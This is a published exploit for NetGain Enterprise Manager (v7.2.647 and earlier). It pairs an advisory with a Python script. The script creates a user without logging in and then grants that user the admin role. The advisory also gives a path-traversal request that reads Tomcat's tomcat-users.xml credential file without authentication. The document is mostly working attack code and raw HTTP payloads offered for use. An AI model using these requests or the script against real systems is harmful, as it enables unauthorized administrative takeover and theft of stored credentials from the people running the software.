'''
# Exploit Title: Add User Account with Admin Privilege without Login & Local File Inclusion
# Date: 2017-05-21
# Exploit Author: f3ci
# Vendor Homepage: http://www.netgain-systems.com
# Software Link: http://www.netgain-systems.com/free-edition-download/
# Version: <= v7.2.647 build 941
# Tested on: Windows 7

Add User Account with Admin Privilege without Login
----------------------------------------------
We can create user and give admin privilege to user which we have made
without login.
Because this app does not check the session on this request


Local File Inclusion
----------------------------------------------
Normal Request:

POST /u/jsp/log/download_do.jsp HTTP/1.1
Host: 192.168.0.21:8081
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101
Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.21:8081/u/index.jsp
Cookie: JSESSIONID=8A172EB8DDBD08D1E6D25A1CE8CC74AC
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

filename=iossd.log

We can download another file with change value on filename parameter and
also we can send this request without login.

Example:

POST /u/jsp/log/download_do.jsp HTTP/1.1
Host: 192.168.0.21:8081
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101
Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.21:8081/u/index.jsp
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

filename=../../tomcat/conf/tomcat-users.xml
'''
#!/usr/local/bin/python
# Exploit Title: Add User Account with Admin Privilege without Login
# Date: 2017-05-21
# Exploit Author: f3ci
# Vendor Homepage: http://www.netgain-systems.com
# Software Link: http://www.netgain-systems.com/free-edition-download/
# Version: <= v7.2.647 build 941
# Tested on: Windows 7

import requests
import sys

try:
 def create():
	ip = str(sys.argv[1])
	port = str(sys.argv[2])
	user = str(sys.argv[3])
	passwd = str(sys.argv[4])

	print "\033[1;32m[+]\033[1;m Try to Create user"
	url="http://"+ip+":"+port+"/u/jsp/security/user_save_do.jsp"
	data= {
    	'new': "true", 
    	'id': "", 
    	'name': user, 
    	'dname': "foobar", 
    	'password': passwd, 
    	'password2': passwd, 
    	'description': "", 
    	'emails': "foo@bar.com", 
    	'mobileNumber': "000000", 
    	'loginAttempts': "5",
    	}
	response = requests.post(url, data=data)
	status = response.status_code
	if status == 200:
		print "\033[1;32m[+]\033[1;m Success!!"
		role()
	else:
		print "\033[91m[-]\033[91;m Create User Failed"


 def role():
	ip = str(sys.argv[1])
        port = str(sys.argv[2])
	user = str(sys.argv[3])
        passwd = str(sys.argv[4])

	print "\033[1;32m[+]\033[1;m Get admin role"
	url="http://"+ip+":"+port+"/u/jsp/security/role_save_do.jsp"
	data= {
    	'name': "admin", 
    	'description': "Administrator", 
    	'users': [user,"admin"],
    	}
	response = requests.post(url, data=data)
	status = response.status_code
	if status == 200:
		print "\033[1;32m[+]\033[1;m Success!!"
		print "\033[1;32m[+]\033[1;m Login with user:" +user+ " password:" + passwd
	else:
		print "\033[91m[-]\033[91;m Get admin role Failed"

 create();

except:
	print "\033[91m[!]\033[91;m Usage: %s <IP> <port> <username> <password>" % str(sys.argv[0])
	print "\033[91m[!]\033[91;m Ex: %s 127.0.0.1 8081 foobar passw0rd" % str(sys.argv[0])
